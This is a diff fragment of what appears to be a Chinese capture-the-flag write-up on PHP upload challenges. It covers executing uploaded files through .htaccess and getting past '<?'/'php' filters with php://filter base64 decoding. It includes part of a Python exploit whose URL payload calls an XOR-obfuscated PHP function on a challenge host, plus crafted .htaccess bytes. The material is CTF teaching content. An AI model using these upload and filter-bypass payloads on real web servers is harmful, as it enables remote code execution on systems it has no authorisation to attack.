@@ -4,7 +4,7 @@
 
 # 2. .htaccess上传导致任意文件执行
 
-### 3. 使用.htaccess结合php://filter/convert.base64-decode/resource= 
+### 3. 使用.htaccess结合php://filter/convert.base64-decode/resource=
 
 ### base64编码绕过，文件中<?,php等字符的检测
 
@@ -196,7 +196,7 @@ exp:
 import requests
 import base64
 
-url = "http://e6934d21-0f78-4fc7-b24c-9e49073933b7.node3.buuoj.cn/?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&%fe=get_the_flag"
+url = "http://e6934d21-0f78-4fc7-b24c-9e49073933b7.node3.buuoj.cn/?_=${`%`fe%fe%fe%fe^%a1%b9%bb%aa}{`%`fe}();&%fe=get_the_flag"
 
 
 htaccess = b"""\x00\x00\x8a\x39\x8a\x39
